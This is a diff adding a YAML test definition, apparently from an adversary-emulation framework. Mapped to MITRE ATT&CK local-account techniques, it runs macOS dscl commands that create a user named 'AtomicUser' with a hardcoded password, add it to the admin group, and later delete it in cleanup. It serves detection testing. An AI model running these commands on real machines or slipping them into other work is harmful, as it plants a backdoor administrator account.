@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Create local account with admin privileges - MacOS
+description: After execution the new account will be active and added to the Administrators group
+uuid: f1275566-1c26-4b66-83e3-7f9f7f964daa
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+        - 'TA0001: Initial Access'
+    techniques:
+        - 'T1078: Valid Accounts'
+    subtechniques:
+        - 'T1078.003: Local Accounts'
+requirements:
+    platforms:
+        - os: darwin
+steps:
+    - name: create-local-account-with-admin-privileges---macos
+      inline: |-
+        dscl . -create /Users/AtomicUser
+        dscl . -create /Users/AtomicUser UserShell /bin/bash
+        dscl . -create /Users/AtomicUser RealName "Atomic User"
+        dscl . -create /Users/AtomicUser UniqueID 503
+        dscl . -create /Users/AtomicUser PrimaryGroupID 503
+        dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser
+        dscl . -passwd /Users/AtomicUser mySecretPassword
+        dscl . -append /Groups/admin GroupMembership AtomicUser
+      executor: bash
+      cleanup:
+        inline: sudo dscl . -delete /Users/AtomicUser
+        executor: bash
